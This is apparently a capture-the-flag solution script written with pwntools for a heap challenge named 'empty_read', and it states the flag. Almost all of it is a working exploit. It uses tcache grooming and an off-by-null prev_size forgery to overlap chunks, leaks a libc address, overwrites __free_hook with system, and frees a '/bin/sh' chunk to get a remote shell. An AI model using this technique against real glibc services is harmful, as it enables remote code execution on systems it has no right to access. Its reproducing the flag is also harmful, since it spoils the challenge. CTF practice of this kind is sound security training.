#exploit for Emptyread
#flag{hippity_hoppity_that_chunk_is_my_property}
from pwn import *
elf = ELF("./empty_read")
libc=ELF('./libc6-i386_2.27-3ubuntu1.2_amd64.so')
context.binary=elf
target=remote('challenge.ctf.games',32535)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(index,size,data="A"):
	sla("---\n","add")
	sa("add:\n",str(index))
	sa("length:\n",str(size))
	sa("email:\n",data)
	
def delete(index):
	sla("---\n","delete")
	sa("delete:\n",str(index))

def leaks():	
	sla("---\n","print")
	target.recvuntil("\t\tUser 1 email: ")
	leak=target.recv(4)
	return leak

for i in range(7):
	add(i,0xf8)

for i in range(3):
	add(7+i,0x8)

for i in range(3):
	delete(7+i)

add(7,0xf8)
add(8,0xe8)
add(9,0xf8)

for i in range(7):
	delete(i)
add(0,0xe8)
delete(7)
delete(8)
add(1,0xec,"A"*0xe8+p32(0x1f0))
delete(9)
add(2,0x88)
add(3,0x68)
libc_base=u32(leaks())-0x1d57d8
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
add(4,0xe8)
delete(4)
delete(0)
delete(1)
add(0,0xe8,p32(libc_free_hook))
add(1,0xe8,"/bin/sh\x00")
add(4,0xe8)
add(5,0xe8,p32(libc_system))
delete(1)
target.interactive()
